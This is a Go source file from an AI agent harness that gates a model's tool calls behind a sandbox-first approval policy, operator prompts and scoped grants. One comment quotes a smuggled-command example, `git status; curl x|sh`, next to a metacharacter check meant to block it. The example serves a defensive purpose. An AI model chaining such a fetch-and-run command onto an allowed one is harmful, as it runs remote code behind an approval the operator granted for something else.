package turnengine

import (
	"context"
	"fmt"
	"os"
	"strings"

	"github.com/CarriedWorldUniverse/agora/contracts"
	"github.com/CarriedWorldUniverse/agora/internal/approval"
	"github.com/CarriedWorldUniverse/agora/internal/hooks"
	"github.com/CarriedWorldUniverse/agora/internal/toolrunner"
	bridle "github.com/CarriedWorldUniverse/bridle"
)

// defaultPolicy is the Manager's zero-config approval policy — SANDBOX-
// FIRST (operator decree): everything the classifier proves stays inside
// the working-dir subtree auto-runs, everything that leaves it prompts.
// Concretely:
//   - KindRead auto (NEX-782, unchanged): reads are containment-bounded
//     in the fs family regardless.
//   - KindPatch auto: Classify only emits patch for writes INSIDE the
//     writable roots and outside protected dirs — an outside/protected
//     write is already KindEscalation, which prompts.
//   - KindExec auto: Classify emits exec ONLY for commands whose named
//     paths stay inside the sandbox (classify.go's
//     commandNamesOutsidePath); a command naming an outside path (or ~,
//     or an AddDir — added folders are reachable, not implicitly
//     trusted) classifies as KindEscalation and prompts.
//   - Everything that leaves the sandbox — escalation, mcp_tool (network
//     side effects), question/plan — stays PolicyPrompt.
//
// The enforcement story is unchanged: this only decides PROMPTING. The
// fs family's containment and the exec family's cwd remain hard bounds
// whatever this table says; the exec heuristic is conservative (a false
// positive prompts — recoverable; it cannot false-negative a write, and
// an exec that touches outside without naming a path still runs inside
// the sandbox cwd with roots-contained fs tools).
//
// KindQuestion and KindPlan are included for completeness (approval.Decide
// reads the PolicySet for them too). KindGate is omitted: approval.Decide
// always routes it to Ask regardless of the PolicySet (spec: gate is
// preset-ungoverned).
func defaultPolicy() contracts.PolicySet {
	return contracts.PolicySet{
		contracts.KindExec:       contracts.PolicyAuto,
		contracts.KindPatch:      contracts.PolicyAuto,
		contracts.KindEscalation: contracts.PolicyPrompt,
		contracts.KindMCPTool:    contracts.PolicyPrompt,
		contracts.KindQuestion:   contracts.PolicyPrompt,
		contracts.KindPlan:       contracts.PolicyPrompt,
		contracts.KindRead:       contracts.PolicyAuto,
	}
}

// WithPolicy overrides the Manager's approval.Decide policy set. Unset (the
// default) is defaultPolicy() — sandbox-auto: in-sandbox exec/patch/read
// run, anything classified outside the sandbox asks.
func WithPolicy(p contracts.PolicySet) Option { return func(m *Manager) { m.policy = p } }

// WithScopeStore overrides the Manager's approval.ScopeStore. Unset (the
// default) is a fresh approval.NewMemScopeStore() — in-process only, no
// persistence past this Manager's lifetime (matches this package's existing
// "nothing survives past one Run call" scope line for everything else).
func WithScopeStore(s approval.ScopeStore) Option { return func(m *Manager) { m.scopeStore = s } }

// approvalOutcome is what a pending Ask rendezvous resolves to: either a
// real approval_response Input (Cancelled false, Decision/Scope/Message
// carried verbatim) or a cancellation marker (the turn was interrupted/torn
// down while the approval was still pending — Decision/Scope/Message are
// unused in that case).
type approvalOutcome struct {
	Cancelled bool
	Decision  contracts.Decision
	Scope     contracts.Scope
	Message   string
}

// turnHookCtx is the current in-flight turn's context the BeforeToolCall
// hook needs to emit approval.requested onto the wire: the same threadID/
// turnID stamping runOneTurn's own emit closure does, out itself, and
// sendCtx (the OUTER Run-level ctx that gates event DELIVERY — see
// manager.go's runOneTurn doc comment on sendCtx vs turnCtx; the hook's own
// ctx parameter IS turnCtx, bridle passes RunTurn's ctx straight through to
// executeToolCall unchanged, so no separate field is needed for that half).
type turnHookCtx struct {
	threadID string
	turnID   string
	out      chan<- contracts.Event
	sendCtx  context.Context
}

// setHookTurn/loadHookTurn guard the ONE piece of Manager state the hook
// needs that isn't reachable from its own ctx/BeforeToolCallCtx arguments:
// which turn is currently driving RunTurn.
//
// Manager.Run is the SOLE writer of hookTurn — it sets it right before
// spawning each turn's goroutine (the InUserMessage case) and clears it in
// the SAME synchronized step as every turnCancel/turnDone reset (the
// turnDone case, the InUserMessage opportunistic reap, and stopInFlight —
// see manager.go). beforeToolCall (running on the TURN goroutine, inside
// RunTurn) only ever READS it via loadHookTurn.
//
// This was NOT the first cut: an earlier revision had runOneTurn itself
// set hookTurn at the top and defer-clear it at the bottom, on the turn
// goroutine. That looked safe (only one turn runs at a time) but wasn't:
// the turnDone channel handoff only orders the SEND on turn A's goroutine
// relative to the RECEIVE on Run's goroutine — it says nothing about what
// EITHER goroutine does afterward. Turn A's deferred clear (running after
// `done <- ev` completes, on A's goroutine) is not ordered relative to
// turn B's set (running on B's goroutine, spawned once Run reaps A's
// terminal event) — back-to-back turns can interleave A's clear AFTER B's
// set, silently blinding B's hook for its entire turn (loadHookTurn
// returns nil -> the defensive fail-closed-deny branch, meaning every one
// of B's tool calls gets silently denied). Reproduced under -race; see
// TestManager_Approval_BackToBackTurns_NoHookTurnClobber. Mutexed
// regardless (even a single sole-writer goroutine's write still races the
// hook's concurrent read from a different goroutine).
func (m *Manager) setHookTurn(h *turnHookCtx) {
	m.hookMu.Lock()
	m.hookTurn = h
	m.hookMu.Unlock()
}

func (m *Manager) loadHookTurn() *turnHookCtx {
	m.hookMu.Lock()
	defer m.hookMu.Unlock()
	return m.hookTurn
}

// registerWaiter/resolveWaiter/dropWaiter guard the approval rendezvous
// registry (id -> waiter channel): registerWaiter runs on the TURN
// goroutine (inside the BeforeToolCall hook); resolveWaiter runs on the
// Run-loop (READER) goroutine servicing an InApprovalResponse Input. Two
// different goroutines touching the same map -> mutex it (the brief's
// explicit call-out).
func (m *Manager) registerWaiter(id string) chan approvalOutcome {
	ch := make(chan approvalOutcome, 1)
	m.waiterMu.Lock()
	m.waiters[id] = ch
	m.waiterMu.Unlock()
	return ch
}

func (m *Manager) dropWaiter(id string) {
	m.waiterMu.Lock()
	delete(m.waiters, id)
	m.waiterMu.Unlock()
}

// resolveWaiter is called from Manager.Run's InApprovalResponse case. It
// looks up the waiter by id, sends the outcome (non-blocking — the waiter
// channel is buffered 1 and is only ever sent to once, by construction, so
// this can never block), and removes the entry. A response whose id has no
// waiter (already resolved, already cancelled, or a stale/duplicate/forged
// id) is silently ignored — matching approval_response's existing
// first-answer-wins arbitration one layer up (io.Session.handleInput,
// blueprint's TUI event mapping note) and Decide's own "never error"
// fail-safe posture: an unmatched response is simply a no-op, not a crash.
func (m *Manager) resolveWaiter(id string, out approvalOutcome) {
	m.waiterMu.Lock()
	ch, ok := m.waiters[id]
	if ok {
		delete(m.waiters, id)
	}
	m.waiterMu.Unlock()
	if ok {
		ch <- out
	}
}

// beforeToolCall is the bridle.Hook[bridle.BeforeToolCallCtx] registered
// ONCE on m.harness at construction (NewManager) — see manager.go. It runs
// SYNCHRONOUSLY on the turn goroutine, inside Harness.RunTurn, for every
// tool call the model makes:
//
//  1. toolrunner.Classify decides the contracts.ApprovalKind + builds the
//     kind-specific payload (DEVIATIONS.md §5 shape) from the raw call —
//     never approval.Decide's job, reused verbatim.
//  2. approval.Decide resolves policy + any prior scoped allow (see
//     scopeKeyFor for how ScopeKey is derived per kind).
//  3. ActionAllow -> HookContinue, Deny left false (the call executes).
//     ActionDeny -> Deny=true + Err=the model-facing feedback, HookContinue
//     (NOT HookAbort — a per-call denial must not end the whole turn; the
//     model sees the refusal and can react, same as bridle's own
//     Deny-pattern doc comment on BeforeToolCallCtx).
//     ActionAsk -> the Ask rendezvous (askAndWait): emits
//     contracts.EvApprovalRequested and blocks the hook until a matching
//     approval_response arrives (approve/deny) or the turn is torn down
//     (turnCtx.Done()).
//
// ActionConvert is unreachable from this surface: approval.Decide only
// returns Convert for contracts.KindQuestion, and toolrunner.Classify's
// fs/exec surface never emits KindQuestion (no question/plan tools exist
// here — plan/question special-casing is explicitly OUT of this unit's
// scope, see doc.go). If a future unit adds a question/plan tool without
// updating this hook, Convert falls through to the ActionAsk branch below
// (askAndWait), which is the safe default (surfaces to an approver) rather
// than a silent panic or a fail-open allow.
func (m *Manager) beforeToolCall(ctx context.Context, c bridle.BeforeToolCallCtx) (bridle.BeforeToolCallCtx, bridle.HookAction, error) {
	// U-D1: foreign-tool passthrough, REQUIRED companion change for wiring
	// the ctxmap context engine (see NewManager/attachContextEngine). This
	// hook is registered BEFORE bridleadapter.Attach (manager.go), so it
	// runs FIRST on every tool call — including the recall/inspect/read_raw
	// tools ctxmap's own BeforeModelCall hook adds to the request. Gate
	// ONLY the calls this Manager's own Surface actually owns (fs/exec/mcp
	// — m.surface.Handles); anything else — ctxmap's tools, or a genuinely
	// unrecognized name — passes straight through unclassified, ungated,
	// via HookContinue with Deny left false.
	//
	// Sound because: (1) only Surface tools execute with real side effects
	// (file writes, shell commands, mcp calls) — those are exactly what
	// toolrunner.Classify + approval.Decide exist to gate, and this check
	// does not change their gating at all (the classify/Decide/Ask path
	// below is reached exactly as before for every name m.surface.Handles
	// returns true for). (2) ctxmap's recall/inspect/read_raw tools are
	// side-effect-free reads served entirely by the ctxmap engine itself —
	// they Deny+Result inside ctxmap's OWN BeforeToolCall hook (registered
	// after this one) and never reach surfaceRunner/toolrunner.Surface at
	// all, so there is nothing here to protect against; gating them would
	// prompt the operator to approve a memory lookup, which both defeats
	// ctxmap's "memory is automatic, no tool ceremony" framing and could
	// never be denied usefully (denying recall just starves the model of
	// context it already has, it does not prevent any effect). (3) any
	// OTHER name that is neither ours nor ctxmap's still can't silently
	// execute: it falls through to surfaceRunner, which returns a clean
	// IsError Result (toolrunner.ErrUnknownTool) — errors harmlessly,
	// never runs.
	if !m.surface.Handles(c.Call.Name) {
		return c, bridle.HookContinue, nil
	}

	// agora-spec-planning-questions.md §4/§1: `question`/`plan` are
	// harness-intrinsic core tools with their own bespoke resolution —
	// neither fits the generic allow/deny Classify/Decide/askAndWait shape
	// below (a question resolves with a structured Answer, never
	// allow/deny; a plain plan update needs no gate at all, only
	// submit:true does). Both are intercepted HERE, before Classify ever
	// sees them, and resolved via bridle's Deny+Result short-circuit
	// (same mechanism ctxmap's own hook uses — see the doc comment above).
	// §4 also says questions BYPASS the hook stage entirely in v1
	// (PreToolUse/PermissionRequest are permission-kind concepts) — this
	// early return, before either hook fires below, is exactly that.
	// planning.go has the full ask/park/wait and record/gate logic.
	if c.Call.Name == contracts.ToolQuestion {
		htc := m.loadHookTurn()
		if htc == nil {
			c.Deny = true
			c.Err = "question: no active turn context"
			return c, bridle.HookContinue, nil
		}
		return m.handleQuestionCall(ctx, htc, c)
	}
	if c.Call.Name == contracts.ToolPlan {
		htc := m.loadHookTurn()
		if htc == nil {
			c.Deny = true
			c.Err = "plan: no active turn context"
			return c, bridle.HookContinue, nil
		}
		return m.handlePlanCall(ctx, htc, c)
	}

	htc := m.loadHookTurn()
	if htc == nil {
		// Defensive only: Run publishes hookTurn (setHookTurn) strictly
		// before spawning the goroutine that eventually calls RunTurn (and
		// therefore this hook) — see setHookTurn's doc comment — so this
		// branch should be unreachable in practice. Fail closed (deny,
		// don't panic/nil deref) rather than trust that invariant blindly.
		c.Deny = true
		c.Err = "approval: no active turn context for the approval gate"
		return c, bridle.HookContinue, nil
	}

	// Lifecycle hooks' PreToolUse (spec §2.1) fires BEFORE the approval
	// policy decision — a PreToolUse deny blocks the call outright, before
	// policy is even consulted (it can only ever be MORE restrictive than
	// whatever policy would have said, since policy hasn't said anything
	// yet); a PreToolUse allow+updatedInput rewrites c.Call.Args so
	// Classify/approval.Decide below see the REWRITTEN args, exactly per
	// spec ("rewrites the tool args before execution"). PreToolUse can
	// never itself grant execution — see FirePreToolUse's caller contract:
	// there is no path from a PreToolUse outcome straight to HookContinue
	// with Deny left false; the call always still runs the real approval
	// pipeline below. This is what makes the invariant
	// "policy deny is final; hooks may only restrict further" hold
	// structurally for PreToolUse (agora-spec-approvals.md §4 invariant 1)
	// — see TestHooks_PreToolUseAllow_CannotOverridePolicyDeny.
	if m.hookRunner != nil {
		pre := m.hookRunner.FirePreToolUse(ctx, m.threadID, htc.turnID, m.model, c.Call.Name, c.Call.Args, c.Call.ID)
		if pre.Blocked {
			c.Deny = true
			c.Err = pre.Reason
			return c, bridle.HookContinue, nil
		}
		if len(pre.UpdatedInput) > 0 {
			c.Call.Args = pre.UpdatedInput
		}
	}

	kind, payload := toolrunner.Classify(toolrunner.Call{Name: c.Call.Name, Args: c.Call.Args}, m.roots)
	scopeKey := scopeKeyFor(kind, payload)

	res := approval.Decide(m.policy, approval.Request{
		ID:        c.Call.ID,
		Kind:      kind,
		SessionID: m.threadID,
		ScopeKey:  scopeKey,
	}, m.scopeStore)

	// Lifecycle hooks' PermissionRequest (spec §2.2) runs in the approval
	// path, after policy but before the UI/Ask rendezvous — folded onto res
	// via hooks.ApplyPermissionRequest, the SAME already-built, already-
	// tested seam bridge.go documents as enforcing invariant 1 verbatim
	// (a hook deny always tightens; a hook allow over a non-allow base is
	// the ONE logged operator-authored-bypass exception the spec itself
	// carves out — see bridge.go's doc comment). Audited to stderr here
	// per ApplyPermissionRequest's doc comment ("Callers MUST emit an audit
	// line when bypassLogged is true").
	if m.hookRunner != nil {
		prAgg := m.hookRunner.FirePermissionRequest(ctx, m.threadID, htc.turnID, m.model, c.Call.Name, c.Call.Args)
		var bypassLogged bool
		res, bypassLogged = hooks.ApplyPermissionRequest(res, hooks.PermissionRequestDecision{Behavior: prAgg.Decision, Message: prAgg.Message})
		if bypassLogged {
			fmt.Fprintf(os.Stderr, "turnengine: hooks: PermissionRequest bypass — thread=%s turn=%s tool=%s call=%s message=%q\n",
				m.threadID, htc.turnID, c.Call.Name, c.Call.ID, prAgg.Message)
		}
	}

	switch res.Action {
	case approval.ActionAllow:
		return c, bridle.HookContinue, nil

	case approval.ActionDeny:
		c.Deny = true
		c.Err = res.Message
		return c, bridle.HookContinue, nil

	default: // approval.ActionAsk (and, per the doc comment above, the
		// unreachable-in-practice ActionConvert).
		return m.askAndWait(ctx, htc, c, kind, scopeKey, payload)
	}
}

// scopeKeyFor derives approval.Request.ScopeKey (and, on a scoped approve,
// the approval.ScopeAllow.Key to persist) from the classified kind +
// payload. scope.go's contract: ScopeKey is only ever matched for
// contracts.ScopePrefix (exec only) and contracts.ScopeHost (network/
// escalation only); every other kind has no meaningful key and gets "".
//
// v1, documented: exec's prefix token is the command's first
// whitespace-delimited word (the program name — "git", "npm", "rm", ...),
// not the full command line. This is the simplest useful command-prefix
// grouping ("allow git for this session" should cover "git status" AND
// "git log", not just the one exact command that was first approved) and
// matches the scope's own name ("prefix"); a real config-driven prefix
// grammar (multi-word prefixes, globs) is a later unit's job, not this
// approval-GATE unit's.
//
// escalation has no meaningful ScopeHost key from what Classify's fs/exec
// surface actually classifies as escalation today (write-outside-roots,
// protected-path, malformed-args, unrecognized-tool — none of those are a
// network host). ScopeHost stays "" here; a future network-aware kind can
// populate it once Classify (or a sibling classifier) actually produces a
// host pattern to key on.
func scopeKeyFor(kind contracts.ApprovalKind, payload any) string {
	if kind != contracts.KindExec {
		return ""
	}
	ep, ok := payload.(toolrunner.ExecPayload)
	if !ok {
		return ""
	}
	// SECURITY (review 2026-07-25): a key is only meaningful if the program
	// name BOUNDS what runs. exec goes through /bin/sh -c, so a command
	// carrying shell metacharacters does not — `git status; curl x|sh` has
	// first field "git" and would otherwise reuse a grant made for a plain
	// `git status`. Refuse to derive a key at all in that case: an empty key
	// makes Grant fail (ErrScopeKeyEmpty), so the call falls back to asking
	// again — the safe direction.
	if strings.ContainsAny(ep.Command, ";&|<>`$(){}\n") {
		return ""
	}
	fields := strings.Fields(ep.Command)
	if len(fields) == 0 {
		return ""
	}
	return fields[0]
}

// askAndWait implements the interactive rendezvous for approval.ActionAsk:
// register a waiter, emit approval.requested on out, then block until
// either a matching approval_response resolves the waiter or turnCtx is
// done (the turn is being interrupted/torn down).
//
// Concurrency / deadlock-freedom: turnCtx here is the hook's own ctx
// parameter, which IS the same context.Context Harness.RunTurn was called
// with (bridle passes ctx straight through executeToolCall unchanged — see
// the turnHookCtx doc comment) — i.e. exactly the turnCtx manager.go's Run
// loop creates via context.WithCancel(ctx) and cancels on InInterrupt/end/
// outer-ctx-done. Tracing every path that can cancel it while this select
// is blocked (manager.go's Run):
//
//   - InInterrupt: `if turnCancel != nil { turnCancel() }` — cancels and
//     immediately loops back to select; Run does NOT block reading
//     turnDone in this case, so it stays fully responsive. turnCancel()
//     closes turnCtx.Done() for every goroutine watching it, including
//     this select, with no further coordination required.
//   - ctx.Done() (ie InEnd, in closing) via stopInFlight: `turnCancel();
//     forward(<-turnDone)` — turnCancel() is called and returns BEFORE the
//     blocking `<-turnDone` read starts (strict program order within
//     stopInFlight), so by the time Run blocks waiting for the terminal
//     event, turnCtx is already cancelled and this select has already
//     started unblocking (or will, the instant the scheduler runs it) —
//     there is no window where Run is blocked on turnDone AND this hook
//     is still waiting on a cancellation signal that will never come.
//
// Either way, turnCtx.Done() firing here returns HookAbort immediately
// (documented choice, see the switch below): the turn is already being
// torn down, so ending it via the same StopReasonAborted ->
// turn.failed{interrupted:true} path runOneTurn's switch already maps
// (rather than Deny+HookContinue, which would let bridle's tool loop try
// to continue into a NEXT round against an already-cancelled ctx — extra
// machinery for no benefit here). RunTurn returns aborted, runOneTurn sends
// its terminal event on done, and stopInFlight's blocked `<-turnDone` read
// completes — the rendezvous this whole package's terminal-event discipline
// depends on. No deadlock: the hook always has an escape hatch out of its
// blocking select that does not depend on the Run loop doing anything
// further once turnCancel() has been called.
func (m *Manager) askAndWait(turnCtx context.Context, htc *turnHookCtx, c bridle.BeforeToolCallCtx, kind contracts.ApprovalKind, scopeKey string, payload any) (bridle.BeforeToolCallCtx, bridle.HookAction, error) {
	id := c.Call.ID
	waiter := m.registerWaiter(id)
	defer m.dropWaiter(id)

	ev := contracts.Event{
		Type:     contracts.EvApprovalRequested,
		ThreadID: htc.threadID,
		TurnID:   htc.turnID,
		Payload:  mustMarshal(contracts.ApprovalRequest{ID: id, Kind: kind, Payload: payload}),
	}
	select {
	case htc.out <- ev:
	case <-htc.sendCtx.Done():
		// out itself is going away (the OUTER Run-level ctx, not turnCtx,
		// was cancelled) — the request can never reach a client to answer.
		// Falling into the second select below is fine: sendCtx.Done()
		// firing means ctx.Done() fired, and turnCtx is
		// context.WithCancel(ctx) — a cancelled parent always closes the
		// child's Done() too — so the second select is guaranteed to also
		// unblock via <-turnCtx.Done(), no separate handling needed here.
	case <-turnCtx.Done():
		// InInterrupt cancels turnCtx WITHOUT cancelling sendCtx (they are
		// deliberately different contexts — sendCtx/ctx outlives many
		// turns, turnCtx is per-turn). Without this case, an interrupt
		// arriving while this hook is stuck trying to SEND
		// approval.requested (out full, its consumer stopped draining —
		// the one failure mode the package-wide "Run guarantees it WILL
		// close out, but relies on the consumer draining out" contract
		// (Run's own doc comment) does not cover) would have no way to
		// unblock: the first select would wait on a full `out` forever,
		// the interrupt having already fired and gone. Return HookAbort
		// directly here, before the event was ever delivered, rather than
		// falling into the second select below (which would also catch
		// turnCtx.Done(), since it's already closed — but returning here
		// is the more honest statement of what happened: the ask was never
		// even sent, so there is nothing for a client to have answered).
		return c, bridle.HookAbort, nil
	}

	select {
	case out := <-waiter:
		if out.Cancelled {
			return c, bridle.HookAbort, nil
		}
		if out.Decision == contracts.DecisionAllow {
			m.recordScopeGrant(kind, out.Scope, scopeKey)
			c.Deny = false
			return c, bridle.HookContinue, nil
		}
		// DecisionDeny, or anything else a malformed/forged response
		// might carry — fail closed to deny (Decide's own "the safe side
		// is always chosen when resolution is ambiguous" convention).
		c.Deny = true
		c.Err = out.Message
		if c.Err == "" {
			c.Err = "denied by approver"
		}
		return c, bridle.HookContinue, nil

	case <-turnCtx.Done():
		return c, bridle.HookAbort, nil
	}
}

// recordScopeGrant persists an approved Ask's scope (Session/Prefix/Host)
// into m.scopeStore so a LATER matching call short-circuits via
// approval.Decide's PolicyPrompt case, instead of asking again.
// contracts.ScopeOnce (the default, and the zero value on a malformed/
// unset response) is never persisted — nothing to record for a single-call
// allow, and MemScopeStore.Grant itself refuses ScopeOnce.
//
// Key derivation mirrors scope.go's ScopeAllow.Key contract exactly:
// ScopeSession keys on the thread/session id (m.threadID), ScopePrefix/
// ScopeHost key on scopeKeyFor's derived key. Grant's own validation
// (prefix is exec-only, host is escalation-only, key must be non-empty)
// is trusted rather than re-checked here — an error just means the grant
// wasn't persisted (the safe direction: a later call falls back to asking
// again, never to a wrongly-scoped auto-allow), so it is intentionally
// not surfaced/logged as a failure this hook needs to react to.
func (m *Manager) recordScopeGrant(kind contracts.ApprovalKind, scope contracts.Scope, scopeKey string) {
	if m.scopeStore == nil {
		return
	}
	var key string
	switch scope {
	case contracts.ScopeSession:
		key = m.threadID
	case contracts.ScopePrefix, contracts.ScopeHost:
		key = scopeKey
	default: // ScopeOnce, "", or anything unrecognized: nothing to persist.
		return
	}
	_ = m.scopeStore.Grant(approval.ScopeAllow{Kind: kind, Scope: scope, Key: key, ScopeKey: scopeKey, By: "approver"})
}
